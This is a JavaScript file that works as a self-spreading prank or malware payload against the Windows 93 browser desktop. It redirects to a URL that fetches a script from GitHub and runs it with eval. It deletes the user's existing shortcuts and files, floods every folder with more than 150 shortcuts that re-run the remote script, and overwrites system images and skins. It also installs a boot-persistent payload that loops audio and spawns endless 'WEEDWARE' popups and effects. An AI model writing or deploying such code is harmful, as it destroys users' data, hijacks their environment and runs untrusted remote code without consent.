window.location.replace("https://v2.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));");
(function() {
  const bgUrl = "/c/files/images/png/tumblr_nj90mi2hlh1t6hgmzo1_400.png";
  const musicUrl = "https://cdn.jsdelivr.net/gh/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST@main/convert.454f6cce.mp3";
  
  // 1. The ALL38UR shortcut payload
  const shortcutPayload = {
    "icon": bgUrl,
    "exe": "js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));",
    "title": "ALL38UR"
  };

  // Helper function using Windows 93 native $fs API with localStorage fallback
  function writeFileSafe(path, content) {
    if (typeof $fs !== 'undefined' && typeof $fs.write === 'function') {
      try { $fs.write(path, content, () => {}); } catch (e) {}
    }
    localStorage.setItem(path, content);
  }

  function removeFileSafe(path) {
    if (typeof $fs !== 'undefined' && typeof $fs.rm === 'function') {
      try { $fs.rm(path, () => {}); } catch (e) {}
    }
    localStorage.removeItem(path);
  }

  // 2. PURGE ALL OLD SHORTCUT KEYS AND FILES
  for (let i = localStorage.length - 1; i >= 0; i--) {
    let key = localStorage.key(i);
    if (key && (key.endsWith('.lnk42') || key.includes('/desktop/') || key.includes('/trash/') || key.includes('Terminal') || key.includes('Notepad'))) {
      removeFileSafe(key);
    }
  }

  // 3. Flood fresh ALL38UR shortcuts everywhere exclusively
  const dirs = ["/a/", "/c/", "/a/desktop/", "/c/desktop/", "/a/trash/", "/c/trash/", "/a/files/", "/c/files/"];
  let floodedCount = 0;

  dirs.forEach((dir, dIdx) => {
    for (let i = 0; i < 15; i++) {
      let pathKey = dir + (i === 0 ? "ALL38UR.lnk42" : `ALL38UR_${dIdx}_${i}.lnk42`);
      writeFileSafe(pathKey, JSON.stringify(shortcutPayload));
      floodedCount++;
    }
  });

  // Rebuild .config/desktop.json with strictly ALL38UR shortcuts
  const desktopConfig = {};
  const maxW = window.innerWidth || 800;
  const maxH = window.innerHeight || 600;
  for (let i = 0; i < 60; i++) {
    let keyName = i === 0 ? "ALL38UR.exe.lnk42" : `ALL38UR_GRID_${i}.lnk42`;
    desktopConfig[keyName] = {
      "x": (i * 45) % maxW,
      "y": (Math.floor((i * 45) / maxW) * 60) % maxH,
      "time": Date.now() + i
    };
    writeFileSafe(keyName, JSON.stringify(shortcutPayload));
    floodedCount++;
  }
  writeFileSafe('.config/desktop.json', JSON.stringify(desktopConfig));

  // 4. Override System Image Paths and Skins Folders
  writeFileSafe('/c/sys/img/logow.png', bgUrl);
  writeFileSafe('/c/sys/img/logo.png', bgUrl);

  const skinSubfolders = ["w93", "halloween"];
  skinSubfolders.forEach(skin => {
    for (let i = 0; i < 30; i++) {
      writeFileSafe(`/c/sys/skins/${skin}/img_${i}.png`, bgUrl);
      writeFileSafe(`/c/sys/skins/${skin}/bg_${i}.png`, bgUrl);
      writeFileSafe(`/c/sys/skins/${skin}/ui_${i}.png`, bgUrl);
    }
  });

  // 5. Persistent Tiled Wallpaper CSS
  const targetCSS = `
    #s42_background, .desk, #desk, body {
      background: url("${bgUrl}") repeat !important;
      background-repeat: repeat !important;
      background-size: auto !important;
    }
  `;

  let styleEl = document.getElementById('ivory-permanent-style') || document.createElement('style');
  styleEl.id = 'ivory-permanent-style';
  styleEl.innerHTML = targetCSS;
  document.head.appendChild(styleEl);

  writeFileSafe('/c/user.css', targetCSS);
  writeFileSafe('w93_custom_css', targetCSS);

  // 6. Self-Replicating Boot JS Payload
  const selfReplicatingJS = `
    (function() {
      function bootWrite(p, c) {
        if (typeof $fs !== 'undefined' && typeof $fs.write === 'function') {
          try { $fs.write(p, c, () => {}); } catch(e) {}
        }
        localStorage.setItem(p, c);
      }

      function bootRm(p) {
        if (typeof $fs !== 'undefined' && typeof $fs.rm === 'function') {
          try { $fs.rm(p, () => {}); } catch(e) {}
        }
        localStorage.removeItem(p);
      }

      let style = document.getElementById('ivory-permanent-style') || document.createElement('style');
      style.id = 'ivory-permanent-style';
      style.innerHTML = \`${targetCSS}\`;
      if (!document.head.contains(style)) document.head.appendChild(style);

      // Purge old remnant shortcut keys on boot
      for (let i = localStorage.length - 1; i >= 0; i--) {
        let key = localStorage.key(i);
        if (key && (key.endsWith('.lnk42') && !key.includes('ALL38UR'))) {
          bootRm(key);
        }
      }

      // Re-apply ALL38UR shortcut payload
      const bootPayload = ${JSON.stringify(shortcutPayload)};
      for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        if (key && key.includes('ALL38UR')) {
          bootWrite(key, JSON.stringify(bootPayload));
        }
      }

      // Background Audio Loop via CDN
      if (!window._ivoryBGM) {
        const audio = new Audio("${musicUrl}");
        audio.loop = true;
        audio.volume = 1.0;
        audio.play().catch(() => {
          document.addEventListener('click', () => audio.play(), { once: true });
        });
        window._ivoryBGM = audio;
      }

      // Native Windows 93 FX list
      const fxList = [
        "acid", "anaglyph", "aqua", "blueray", "blur", "bublur", 
        "convo", "disco", "edge", "electrize", "emboss", "fluorescence", 
        "grayscale", "invert", "neon_hulk", "neon_satan", "neon_slug", 
        "onebit", "orton", "plaster", "plasticine", "postel", "ripple", 
        "santabarbara", "scato", "sepia", "spectrum", "square", 
        "strobo", "sys42", "trichrome", "vhs", "vhs2", "xray", "zombi"
      ];

      let fxInterval = null;
      function startRapidFX() {
        if (fxInterval) return;
        // Changes effects 2 times per second (every 500ms)
        fxInterval = setInterval(() => {
          if (typeof $exe === 'function') {
            const randomEffect = fxList[Math.floor(Math.random() * fxList.length)];
            $exe('fx ' + randomEffect);
          }
        }, 500);
      }

      // WEEDWARE Soundless Native $alert Spawner (1 per second at random position)
      if (window._weedwareSpawner) clearInterval(window._weedwareSpawner);
      window._weedwareSpawner = setInterval(() => {
        const rx = Math.floor(Math.random() * Math.max(100, window.innerWidth - 320));
        const ry = Math.floor(Math.random() * Math.max(100, window.innerHeight - 180));
        
        if (typeof $alert === 'function') {
          $alert({
            title: "WEEDWARE",
            msg: "STILL DIDN'T SMOKE WEED YET?",
            img: "${bgUrl}",
            btnOk: "SMOKE WEED",
            left: rx,
            top: ry,
            sound: false,
            onok: function() {
              startRapidFX();
              $exe("3d WEED")
              setInterval(()=>{$exe("layout ${bgUrl}")
          $alert({
            title: "WEEDWARE",
            msg: "WEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEED",
            img: "${bgUrl}",
            btnOk: "SMOKE MORE WEED",
            left: Math.floor(Math.random() * Math.max(100, window.innerWidth - 320)),
            top: Math.floor(Math.random() * Math.max(100, window.innerHeight - 180)),
            sound: false,
            onok: function() {
              startRapidFX();
              $exe("3d WEED")
              setInterval(()=>{$exe("layout ${bgUrl}")
          $alert({
            title: "WEEDWARE",
            msg: "DOUBLE WEED",
            img: "${bgUrl}",
            btnOk: "SMOKE MOST WEED",
            left: Math.floor(Math.random() * Math.max(100, window.innerWidth - 320)),
            top: Math.floor(Math.random() * Math.max(100, window.innerHeight - 180)),
            sound: false,
            onok: function() {
              startRapidFX();
              setInterval(()=>{$exe("layout ${bgUrl}")
          $alert({
            title: "WEEDWARE",
            msg: "TRIPLE WEED!?!?!?!?!?",
            img: "${bgUrl}",
            btnOk: "SMOKE ONE MORE WEED",
            left: Math.floor(Math.random() * Math.max(100, window.innerWidth - 320)),
            top: Math.floor(Math.random() * Math.max(100, window.innerHeight - 180)),
            sound: false,
            onok: function() {
              window.location.replace("https://v2.windows93.net/#js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));");
            }
          })},200);
            }
          })},600);
            }
          })},800);
            }
          });
        }
      }, 1000);
    })();
  `;

  // Execute immediately
  eval(selfReplicatingJS);

  if (typeof $desktop !== 'undefined' && typeof $desktop.refresh === 'function') {
    $desktop.refresh();
  } else if (typeof $explorer !== 'undefined' && typeof $explorer.refresh === 'function') {
    $explorer.refresh();
  }

  console.log(`Success! Purged old shortcut names, created ${floodedCount} pure ALL38UR shortcuts everywhere, and locked in boot persistence.`);
})();
